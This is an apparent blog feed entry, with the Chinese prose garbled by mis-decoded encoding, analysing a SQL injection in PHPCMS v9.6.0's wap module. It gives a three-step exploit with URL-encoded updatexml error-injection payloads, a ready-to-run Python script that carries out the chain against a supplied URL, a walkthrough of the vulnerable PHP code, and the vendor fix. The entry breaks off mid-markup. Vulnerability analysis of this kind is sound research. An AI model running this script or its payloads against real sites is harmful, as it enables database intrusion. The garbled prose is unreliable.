    <category term="webå®‰å…¨" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHPä»£ç å®¡è®¡" scheme="https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡ä¹‹PHPCMSv9.6.0 wapæ¨¡å—SQLæ³¨å…¥æ¼æ´åˆ†æ</title>
    <link href="https://taonn.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://taonn.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-02-09T10:55:00.000Z</published>
    <updated>2021-04-08T13:15:55.700Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å‚è€ƒ<a href="https://taonn.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ</a></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ­¤æ¼æ´åˆ©ç”¨è¿‡ç¨‹å¯èƒ½ç¨æœ‰å¤æ‚ï¼Œæˆ‘ä»¬å¯åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š</p><ul><li><font color="red">Step1ï¼š</font>GETè¯·æ±‚è®¿é—®<code>/index.php?m=wap&amp;c=index&amp;siteid=1</code><ul><li>è·å–<code>set-cookie</code>ä¸­çš„<code>_siteid </code>ç»“å°¾çš„ cookie å­—æ®µçš„<strong>å€¼</strong></li></ul></li><li><font color="red">Step2ï¼š</font><font color="purple">1</font>. POSTè¯·æ±‚è®¿é—® <code>/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao</code><ul><li>ä¸Šé¢è®¿é—®çš„urlé€šè¿‡URLè§£ç ä¸ºï¼š<code>index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao</code> (<font color="red">æŠ¥é”™æ³¨å…¥ï¼Œè¯­å¥å¯æ›¿æ¢</font>)</li><li><font color="purple">2.</font> å°†<code>Step1</code>è·å–<code>_siteid </code>ç»“å°¾çš„ cookie å­—æ®µçš„<strong>å€¼</strong>ï¼Œèµ‹å€¼ç»™ <code>userid_flash</code> å˜é‡,ä»¥postæ•°æ®æäº¤</li><li>è·å–<code>set-cookie</code>ä¸­çš„<code>_json</code>ç»“å°¾å­—æ®µçš„<strong>å€¼</strong></li></ul></li><li><font color="red">Step3ï¼š</font>è®¿é—®<code>/index.php?m=content&amp;c=down&amp;a_k=</code><font color="red">step2è·å–çš„_jsonç»“å°¾å­—æ®µçš„å€¼</font><ul><li>egï¼š<code>/index.php?m=content&amp;c=down&amp;a_k=0e72z-2m8OJyw8injqvbY0xJtR5l5UtndXiFZmxcvK9kHkxN1COlnfyINF38Opx6UcdqlABV2gc-8RuG90sS6e31lJn2mxnkJPnUaQDCTAs0gEsKMnL5CHxl-o1hYg2TWaL5blo9RC8ya0yLkSc5NgzCqfTSgZCAlndhgum-OFk1XGARihPaYUs</code></li></ul></li></ul><p>Step1ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175727320.png" alt="image-20210327175727320"></p><p>Step2ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175905005.png" alt="image-20210327175905005"></p><p>Step3ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327175959483.png" alt="image-20210327175959483"></p><p>è€æ ·å­ï¼Œè´´ä¸ªå°è„šæœ¬ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: Tao</span></span><br><span class="line"><span class="string">version: python3</span></span><br><span class="line"><span class="string"># æœ¬è„šæœ¬æ‰§è¡Œè¿”å›user()ä¿¡æ¯</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># from urllib import parse</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WAP_SQL</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># step1</span></span><br><span class="line">    url_one = url + <span class="string">&#x27;/index.php?m=wap&amp;c=index&amp;siteid=1&#x27;</span></span><br><span class="line">    step1 = requests.get(url_one)</span><br><span class="line">    userid_flash = step1.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step2</span></span><br><span class="line">    payload = <span class="string">&#x27;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&#x27;</span></span><br><span class="line">    url_two = url + <span class="string">r&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=&#123;&#125;&quot;</span>.format(requests.utils.quote(payload))<span class="comment"># æ‰§è¡ŒSQLè¯­å¥ï¼Œæ­¤å¤„å¯ä¿®æ”¹</span></span><br><span class="line">    step2 = requests.post(url_two, data=&#123;<span class="string">&#x27;userid_flash&#x27;</span>: userid_flash&#125;)</span><br><span class="line">    <span class="keyword">for</span> cookie <span class="keyword">in</span> step2.cookies:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;_att_json&#x27;</span> <span class="keyword">in</span> cookie.name:</span><br><span class="line">            att_json = cookie.value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step3</span></span><br><span class="line">    url_three = url + <span class="string">&#x27;/index.php?m=content&amp;c=down&amp;a_k=&#123;&#125;&#x27;</span>.format(att_json)</span><br><span class="line">    step3 = requests.get(url_three)</span><br><span class="line">    res = re.findall(<span class="string">r&quot;MySQL Error : &lt;/b&gt;XPATH syntax error: &#x27;(.*?)&#x27;&quot;</span>,step3.text)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    result_sql = WAP_SQL(url)</span><br><span class="line">    print(result_sql)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328141903180.png" alt="image-20210328141903180"></p><p>è„šæœ¬åœ¨å¯¹<font color="red">Stpe2</font>é‚£é‡Œè¿›è¡Œäº†ä¸æ‰‹å·¥ä¸ä¸€æ ·çš„å¤„ç†ï¼ŒåŸå› å°±æ˜¯æŒ‰ç…§æ‰‹å·¥çš„æ–¹æ³•è¿›è¡Œç¼–å†™çš„è„šæœ¬ä¼šæŠ¥é”™ï¼Œå…·ä½“æ˜¯ä»€ä¹ˆé—®é¢˜ä»¥åŠåŸå› <font color="red">çœ‹æ–‡å°¾çš„åˆ†æã€‚</font>&gt;å€¼å¾—ä¸€çœ‹ï¼ï¼ï¼</p><h2 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ä¸ºäº†æ›´å¥½çš„ç†è§£è¿™ä¸ªæ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œæˆ‘ä»¬é‡‡å–çš„æ–¹å¼æ˜¯ä»åå¾€å‰åˆ†æã€‚</p><p>æ ¹æ®<font color="red">step3</font>è¯·æ±‚çš„URLåœ°å€ï¼Œå¯ä»¥å®šä½åˆ°<code>phpcms\modules\content\down.php</code>æ–‡ä»¶<code>init</code>å‡½æ•°ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327180215866.png" alt="image-20210327180215866"></p><p>ä¸Šé¢ä»£ç é€šè¿‡GETè·å–åˆ°äº†<code>$a_k</code>çš„å€¼,ç„¶åå°†<code>$a_k</code>å¸¦å…¥<code>sys_auth</code>å‡½æ•°è¿›è¡Œè§£å¯†ï¼ˆ<code>DECODE</code>ï¼‰,è‡³äºæ˜¯å¦‚ä½•åŠ å¯†çš„ï¼Œæˆ‘ä»¬æ— éœ€å…³å¿ƒï¼Œä½†æ˜¯æˆ‘ä»¬è¦çŸ¥é“çš„æ˜¯<code>$a_k</code>çš„å€¼æ˜¯ä»æ‹¿æ¥çš„ï¼Œä¹Ÿå°±æ˜¯<font color="red">Step2</font>æ„é€ çš„è¯­å¥æ˜¯å“ªé‡Œè¿›è¡ŒåŠ å¯†å¤„ç†çš„ï¼Œè¿˜æœ‰å°±æ˜¯åŠ å¯†ç”¨çš„keyã€‚</p><p>æ‰§è¡Œåˆ°17è¡Œï¼Œæ­¤æ—¶<code>$a_k=&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id=%27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao&quot;,&quot;filename&quot;:&quot;&quot;&#125;</code>ï¼Œè¿™é‡Œè¿˜éœ€è¦æ³¨æ„<code>parse_str</code>è¿™ä¸ªå‡½æ•°</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328190127279.png" alt="image-20210328190127279"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328190156309.png" alt="image-20210328190156309"></p><p>é€šè¿‡å®˜æ–¹ç»™çš„ä¾‹å­å¯çŸ¥ï¼Œ<code>parse_str</code>ä¼šå°†ä¼ å…¥çš„å€¼æ ¹æ®<code>&amp;</code>è¿›è¡Œåˆ†å‰²ã€‚ç„¶åè§£ææ³¨å†Œå˜é‡ã€‚å¹¶ä¸”ä¼šå¯¹å†…å®¹è¿›è¡ŒURLè§£ç ã€‚</p><p>ä¸ºäº†æ›´å¥½çš„ç†è§£ä¸Šé¢è¿™æ®µè¯ï¼Œçœ‹ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327180803311.png" alt="image-20210327180803311"></p><p>ç”±å›¾å¯çŸ¥ï¼Œå½“æ‰§è¡Œ<code>parse_str</code>å‡½æ•°ï¼Œä»–ä¼šè¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p><ul><li>1.æ ¹æ®&amp;ç¬¦è§£æ<code>$a_k</code>çš„å€¼ï¼Œæ³¨å†Œå˜é‡</li><li>2.å°†è§£æåå˜é‡çš„å€¼è¿›è¡ŒURLè§£ç </li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327183751439.png" alt="image-20210327183751439"></p><p>ç»§ç»­æ‰§è¡Œï¼Œåˆ°26è¿›è¡Œäº†SQLè¯­å¥æ‰§è¡Œï¼Œè·Ÿè¿›ä¸€ä¸‹</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181035109.png" alt="image-20210327181035109"></p><p>ä¸Šå›¾å¯çŸ¥ï¼Œæ‰§è¡Œçš„SQLè¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> `phpcmsv96`.`v9_news_data` WHERE  `id` = <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">1</span>,(user())),<span class="number">1</span>)<span class="comment">#&#x27; LIMIT 1</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†è¯­å¥æ”¾åˆ°æ•°æ®åº“æ‰§è¡Œä¸€ä¸‹ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181243461.png" alt="image-20210327181243461"></p><p>æ­£å¸¸è¿”å›äº†ï¼Œä½†å»æ‰<code>#</code>ï¼ŒæŠ¥é”™ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327181307957.png" alt="image-20210327181307957"></p><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ<font color="red">Step2</font>å¤„ï¼Œæ„é€ çš„SQLæŠ¥é”™è¯­å¥åé¢æ·»åŠ <code>#</code>è¿›è¡Œæ³¨é‡Š</p><p>æ¥ä¸‹æ¥åˆ†æ<font color="red">Step2</font>,æˆ‘ä»¬éœ€è¦å¼„æ˜ç™½ï¼Œ<code>$a_k</code>çš„å€¼æ˜¯æ€ä¹ˆå¾—åˆ°çš„ï¼Œä»¥åŠä¸ºä»€ä¹ˆPOSTè¯·æ±‚æ•°æ®ä¸­éœ€è¦æ·»åŠ <code>userid_flash</code>å­—æ®µå’Œå¯¹åº”çš„å€¼æ˜¯æ€ä¹ˆæ¥çš„ã€‚</p><p>æ ¹æ®Step2çš„è¯·æ±‚ï¼Œæˆ‘ä»¬å®šä½åˆ°<code>/phpcms/modules/attachment/attachments.php</code>ä¸­<code>swfupload_json</code>å‡½æ•°ã€‚</p><p>ç”±äº<code>swfupload_json</code>æ–¹æ³•æ˜¯<code>attachments</code>ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹çœ‹ç±»ä¸­çš„æ„é€ å‡½æ•°ã€‚ï¼ˆä¸çŸ¥é“ä½ æœ‰æ²¡æœ‰å‘ç°ä»€ä¹ˆï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327194234490.png" alt="image-20210327194234490"></p><p>ç±»ä¸­çš„æ„é€ å‡½æ•°åˆå§‹åŒ–ä¼šåˆ¤æ–­ï¼ˆ21-23è¡Œï¼‰æ˜¯å¦æœ‰<code>$this-&gt;userid</code>ï¼Œé‚£ä¹ˆè¿™ä¸ª<code>$this-&gt;userid</code>æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Œ17è¡Œå¯¹å®ƒè¿›è¡Œäº†èµ‹å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">&#x27;userid&#x27;</span>] ? $_SESSION[<span class="string">&#x27;userid&#x27;</span>] : (param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) ? param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) : sys_auth($_POST[<span class="string">&#x27;userid_flash&#x27;</span>],<span class="string">&#x27;DECODE&#x27;</span>));</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„è¿™ä¸€è¡Œä»£ç ï¼Œé€šè¿‡ä¸‰å…ƒè¿ç®—ç¬¦åˆ¤æ–­<code>$_SESSION[&#39;userid&#39;]</code>æ˜¯å¦æœ‰å€¼ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥åˆ©ç”¨ä¸­ï¼Œè‚¯å®šæ˜¯æ²¡æœ‰å€¼çš„ï¼Œç„¶åæ‰§è¡Œ<code>(param::get_cookie(&#39;_userid&#39;)</code>ï¼Œç„¶åæˆ‘ä»¬cookieä¹Ÿæ²¡æœ‰<code>_userid</code>ï¼Œæ‰€ä»¥æœ€ç»ˆ<code>$this-&gt;userid = sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327194935840.png" alt="image-20210327194935840"></p><p><code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;))</code>å°±æ˜¯å¯¹æˆ‘ä»¬step2ä¸­<code>userid_flash</code>çš„å€¼è¿›è¡Œè§£å¯†,è¿™é‡Œè·ŸStep3è§£å¯†æ˜¯åŒä¸€ä¸ªå‡½æ•°ï¼Œèµ°ä¸‹æ¥ï¼Œ<code>$this-&gt;userid=1</code>ï¼Œå°±è¿‡äº†21è¡Œçš„åˆ¤æ–­ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆPOSTè¯·æ±‚æ•°æ®ä¸­æ·»åŠ <code>userid_flash</code>å­—æ®µã€‚</p><p>æ¥ç€åˆ†æ<code>swfupload_json</code>æ–¹æ³•</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195154232.png" alt="image-20210327195154232"></p><p>è¿™é‡Œé€šè¿‡GETè¯·æ±‚è·å–äº†<code>src</code>çš„å€¼ï¼ˆæŠ¥é”™æ³¨å…¥è¯­å¥ï¼‰ã€‚å¹¶ä¸”ç»è¿‡äº†<code>safe_replace</code>å‡½æ•°çš„å¤„ç†ã€‚è·Ÿè¿›ä¸€ä¸‹æ­¤è¿˜èƒ½è¾“ï¼Œçœ‹çœ‹å¦‚ä½•å¤„ç†çš„ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195328966.png" alt="image-20210327195328966"></p><p>è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½å°±æ˜¯å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œå½“ç»è¿‡è¿™ä¸ªå‡½æ•°ï¼Œæœªä½œå¤„ç†<code>$string</code>å€¼ä¸º<code>&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao</code>ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195419521.png" alt="image-20210327195419521"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195446784.png" alt="image-20210327195446784"></p><p>èµ°å®Œä»¥åï¼Œå®ƒå°†æˆ‘ä»¬ä¼ å…¥çš„<code>%*27</code>å˜æˆäº†<code>%27</code>ã€‚ï¼ˆä¸Šä¸Šå›¾è¿›è¡Œè¿‡æ»¤çš„ï¼‰è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦åŠ <code>*</code>å·</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195633409.png" alt="image-20210327195633409"></p><p>ç»§ç»­æ‰§è¡Œï¼Œåˆ°244è¡Œç”±äºcookieä¸­æ²¡æœ‰<code>att_json</code>ï¼Œæ‰€ä»¥è·³è½¬è‡³250è¡Œè¿›è¡Œè®¾ç½®cookieã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327195855574.png" alt="image-20210327195855574"></p><p>å¯ä»¥å‘ç°ï¼Œè¿™é‡ŒcookieåŠ å¯†ä¹Ÿæ˜¯ç”¨çš„<code>sys_auth</code>å‡½æ•°(è·Ÿ<font color="red">Step3</font>è§£å¯†ç”¨çš„åŒä¸€ä¸ªå‡½æ•°)ï¼Œè¿™é‡Œçš„keyæœªæŒ‡å®šï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327200212416.png" alt="image-20210327200212416"></p><p>å›¾ä¸­å¯ä»¥å¾—çŸ¥ï¼Œå½“<code>key</code>ä¸ºç©ºæ—¶ï¼Œä½¿ç”¨<code>pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)</code>ã€‚è·Ÿ<font color="red">Step3</font>ä½¿ç”¨çš„ä¸€è‡´ã€‚</p><p>æ¥ç€åˆ†æ<font color="red">Step1</font></p><p>å‰é¢æåˆ°ä¸ºä»€ä¹ˆåŠ <code>userid_flash</code>å‚æ•°ï¼Œ<code>$this-&gt;userid = sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</code>ï¼Œä¸ºäº†è¿‡æ˜¯å¦ç™»å½•çš„åˆ¤æ–­ã€‚è€Œä¸”è¿™é‡Œä¼ å…¥<code>userid_flash</code>çš„å€¼å¿…é¡»æ˜¯åˆæ³•çš„cookieï¼Œä¹Ÿå°±æ˜¯é€šè¿‡<code>set_cookie</code>å‡½æ•°è®¾ç½®çš„cookieï¼Œè€Œåˆå› <code>set_cookie</code>å‡½æ•°è®¾ç½®cookieä¼šé€šè¿‡<code>sys_auth</code>åŠ å¯†ã€‚è¿™æ ·çš„è§£å¯†æ‰æœ‰æ•ˆã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»å“ªé‡Œæ— æ·»åŠ å³å¯è·å–cookieï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯wapæ¨¡å—çš„æ¥å£ã€‚åœ¨<code>phpcms/modules/wap/index.php</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327203005540.png" alt="image-20210327203005540"></p><p>ä¸Šå›¾ä»£ç å¤„é€šè¿‡GETè·å–<code>siteid</code>çš„å€¼,ç„¶åä¸ºå…¶è®¾ç½®cookieã€‚</p><p>æ•´ä¸ªæ¼æ´çš„åˆ©ç”¨æµç¨‹å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328185153027.png" alt="image-20210328185153027"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328184248076.png" alt="image-20210328184248076"></p><p>å¯¹<code>$a_k</code>è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸”å°†<code>$id</code>è¿›è¡Œäº†ç±»å‹è½¬æ¢</p><h2 id="å‰é¢æåˆ°é—®é¢˜çš„åˆ†æ"><a href="#å‰é¢æåˆ°é—®é¢˜çš„åˆ†æ" class="headerlink" title="å‰é¢æåˆ°é—®é¢˜çš„åˆ†æ"></a>å‰é¢æåˆ°é—®é¢˜çš„åˆ†æ</h2><p>ä¸çŸ¥é“ä½ ä»¬æœ‰æ²¡æœ‰å‘ç°ï¼Œæ‰‹å·¥åˆ©ç”¨è·Ÿè„šæœ¬å®ç°çš„æ—¶å€™ä¸å¤ªä¸€æ ·ï¼ˆè§ä¸‹å›¾ï¼‰</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328142217269.png" alt="image-20210328142217269"></p><p>æ­£å¸¸æ¥è¯´ï¼Œå› ä¸ºæ‰‹å·¥åˆ©ç”¨çš„æ—¶å€™ç›´æ¥è®¿é—®<code>/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao</code>,é‚£ä¹ˆå¯¹åº”è„šæœ¬åº”è¯¥å¦‚ä¸‹å†™ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_two = url + <span class="string">&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao&quot;</span><span class="comment"># æ‰§è¡ŒSQLè¯­å¥ï¼Œæ­¤å¤„å¯ä¿®æ”¹</span></span><br></pre></td></tr></table></figure><p>ä½†å½“æˆ‘ä»¬è¿™ä¹ˆå†™ï¼Œæ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327154645630.png" alt="image-20210327154645630"></p><p>åˆšå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯URLå†™é”™äº†ï¼Œåé¢åˆæµ‹äº†ä¸€éã€‚å‘ç°æ‰‹å·¥å¯ä»¥ï¼Œä½†æ˜¯å¸¦åˆ°è„šæœ¬å°±ä¸è¡Œã€‚ç”±äº<font color="red">Step2</font>æ˜¯æœ¬è„šä¸­æœ€é‡è¦çš„ç¯èŠ‚ï¼Œæˆ‘å°±å¾ˆç¡®åˆ‡çš„å°±æŠŠé—®é¢˜å®šä½åˆ°äº†è¿™é‡Œã€‚æœ€åå®åœ¨æ²¡åŠæ³•äº†ï¼ˆæƒ³ææ‡‚ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼‰ï¼Œè¢«requestsè¿™ä¸ªåº“é€¼åˆ°ç»è·¯äº†(è„šæœ¬è¿™ä¸ªé”™æ’äº†å¥½ä¹…çš„ğŸ˜­)ï¼Œäºæ˜¯æˆ‘å°±å»çœ‹äº†ä¸€ä¸‹requestsåº“çš„æºä»£ç ï¼Œçœ‹çœ‹å®ƒå¯¹urlæ˜¯æ€ä¹ˆå¤„ç†çš„ã€‚æœ€ç»ˆå¾—åˆ°çš„ç»“æœå°±æ˜¯<font color="red">requestsåº“å¯¹è¯·æ±‚çš„urlåšäº†<code>urlencode</code></font>ã€‚å½“æˆ‘å¾—åˆ°è¿™ä¸ªç»“è®ºçš„æ—¶å€™ï¼Œå¤§ä½¬å‘Šè¯‰æˆ‘<code>ä¸encodeæ€ä¹ˆä¼ é€’</code>ï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™ï¼Œå½“æ—¶æˆ‘æ€ä¹ˆå°±æ²¡æƒ³åˆ°è¿™ä¸ªå‘¢ã€‚ä½†åé¢åˆä»”ç»†æƒ³äº†æƒ³ï¼Œåˆ†æè¿™äº›æ¼æ´ï¼Œæ ¹æ®å‰è¾ˆçš„pocï¼Œå­¦ä¹ è¿™äº›æ‰‹æ³•ï¼Œé‚£ä¹ˆè¿™äº›æ‰‹æ³•å¤§å¤šæ•°ä¸å°±æ˜¯ä¸æŒ‰å¥—è·¯å‡ºç‰Œå˜›ã€‚ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è‡ªå·±å†è¯´å•¥ï¼Œåæ­£ç„å­¦ã€‚ã€‚ã€‚ï¼‰</p><p>è¿›è¡Œ<code>urlencode</code>åœ¨ä¸‹å¤„ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210327231720576.png" alt="image-20210327231720576"></p><p>æ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328213156138.png" alt="image-20210328213156138"></p><p>å›å½’æ­£ä¼ ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä»¥Step2è¯·æ±‚çš„urlä¸ºä¾‹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.phpcms96.com/index.php/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao</span><br></pre></td></tr></table></figure><p>æ­£å¸¸è¯·æ±‚æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†å½“ä½¿ç”¨requestsåº“è¯·æ±‚æ—¶URLå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210328144942755.png" alt="image-20210328144942755"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 